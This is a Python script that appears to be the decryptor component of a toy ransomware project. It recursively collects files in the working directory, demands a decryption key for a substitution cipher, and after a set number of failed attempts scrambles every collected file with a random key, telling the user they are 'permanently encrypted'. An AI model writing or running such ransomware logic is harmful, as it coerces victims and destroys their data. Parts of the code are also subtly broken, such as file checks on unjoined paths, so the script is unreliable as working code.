import os
import random

files = []

if not "args" in locals():
    args = []

def appenddir(dir):
	dirfiles = []
	for file in os.listdir(dir):
		if file == "ware.py" or file ==  "key.pass" or file == "antiware.py" or file == "console.py" and dir == os.getcwd():
			continue
		if os.path.isfile(file):
			files.append(os.path.join(dir, file))
			dirfiles.append(file)
		if os.path.isdir(file):
			appenddir(os.path.join(dir, file))
appenddir(os.getcwd())

if ("-key" in args and len(args) >= args.index("-key") + 1 and args[0] == "decrypt"):
    key = args[args.index("-key") + 1].replace("\\n", "\n")
elif (args[0] == "decrypt"):
    key = input("please enter the decryption key\n") + "\n" + input("")


alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()-=_+[]{}\\|\n"

with open("key.pass", "r") as thekey:
    rightkey = thekey.read()

def decrypt_files(files, key, alphabet):
    finishedfiles = []
    for file in files:
        try:
            with open(file, "r") as thefile:
                contents = thefile.read()
                contents_decrypted = ""
                for encletter in contents:
                    if encletter in key:
                        index = key.index(encletter)
                        decrypted_letter = alphabet[index]
                        contents_decrypted += decrypted_letter
                    else:
                        contents_decrypted += encletter
            with open(file, "w") as thefile:
                thefile.write(contents_decrypted.replace('਍ഀ', ''))
            finishedfiles.append(file)
        except Exception as e:
            print(f"Error decrypting file {file}: {e}")
    print(f"decryption finished for {str(finishedfiles)}")

def check_key(key, right_key, attempts, alphabet):
    if key != right_key:
        attempts -= 1
        if attempts == 0:
            print("Wrong input, files have been permanently encrypted")
            key = ''.join(random.sample(alphabet, len(alphabet)))
            decrypt_files(files, key, alphabet)
        else:
            print(f"Wrong input, {attempts} attempts left")
            check_key(input("Please enter the decryption key:\n") + "\n" + input(""), right_key, attempts, alphabet)
    else:
        decrypt_files(files, key, alphabet)
   
if (len(args) >= 1 and args[0] == "decrypt"):
    if ("-attempts" in args and len(args) >= args.index("-attempts") + 1 and args[0] == "decrypt"):
         attempts = int(args[args.index("-attempts") + 1])
    else: 
        attempts = 3
    check_key(key, rightkey, attempts, alphabet)
elif (len(args) >= 1 and args[0] == "-key"):
     print(rightkey)